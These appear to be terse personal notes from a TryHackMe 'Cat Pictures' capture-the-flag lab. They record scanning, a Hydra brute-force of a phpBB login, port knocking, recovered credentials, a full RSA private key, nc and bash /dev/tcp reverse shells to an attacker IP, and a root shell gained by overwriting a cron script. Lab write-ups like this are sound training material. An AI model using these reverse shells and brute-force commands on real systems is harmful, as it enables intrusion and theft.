[https://tryhackme.com/room/catpictures](https://tryhackme.com/room/catpictures)
 
21 ftp  
22 ssh  
8080 http  
4420 nvm-express?  
2375 docker
 
/images  
/ext  
/download  
/docs  
/bin  
/assets  
/files  
/includes  
/feed  
/language  
/config  
/store  
/licenses  
/adm  
/cache  
/vendor  
/styles  
*** stopped bc way too many lol
 
Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27  
OpenSSH 7.6p1
 
webapp powered by phpBB
 
hydra -t 4 -l admin -P /usr/share/wordlists/rockyou.txt [http://10.10.213.94](http://10.10.213.94) -s 8080 http-post-form "/ucp.php?mode=login&redirect=./index.php?:username=admin&password=admin&redirect=.%2Fucp.php%3Fmode%3Dlogin&creation_time=1623717113&form_token=dfaedee2e478a6215d3778ebf2e8c3bf9ebb20a2&sid=9a2d5bc4bbdabbbc15d80c339658f4b3&redirect=.%2Findex.php%3F&login=Login:You have specified an incorrect username. Please check your username and try again. If you continue to have problems please contact the Board Administrator."
 
port knocking:  
for PORT in 1111 2222 3333 4444; do nc -vz 10.10.213.94 $PORT; done;
 
nmap -p 21, 22, 8080, 4420, 2375
 
21 ftp is open
 
get note.txt
 
catlover:sardinethecat  
internal shell service on port 4420
 
bash  
cat  
echo  
ls  
nc  
rm  
sh  
mkfifo  
touch  
wget
   

[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
NC REVSHELL:  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.141.138 8888 >/tmp/f  
or  
nc -e /bin/sh <ip> <port>
 
On Attacking machine:  
nc -vlp 9999 > loot/runme  
On Target machine (from revshell):  
nc -N ATTACKING_IP 9999 < /home/catlover/runme
 
strings
 
rebecca  
Please enter yout password:  
Welcome, catlover! SSH key transfer queued!  
touch /tmp/gibmethesshkey
 
cat home/catlover/id_rsa
 
-----BEGIN RSA PRIVATE KEY-----  
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5  
IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k  
jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u  
xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H  
tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr  
lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o  
aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte  
D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB  
QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s  
/+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63  
zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/  
oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv  
00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp  
tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy  
QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ  
zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro  
Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK  
68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq  
Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC  
tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu  
aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf  
ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM  
RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR  
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt  
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=  
-----END RSA PRIVATE KEY-----
 
chmod 600 id_rsa  
ssh -i id_rsa catlover@ip
 
cat /root/flag.txt
 
ls -la  
/opt/clean/clean.sh
 
netcat listener on attacker machine;
 
echo "bash -i >& /dev/tcp/10.10.141.138/8080 0>&1" > clean.sh
 
chmod +x clean.sh
 
./clean.sh
 
wait...
 
should have root shell outside of docker env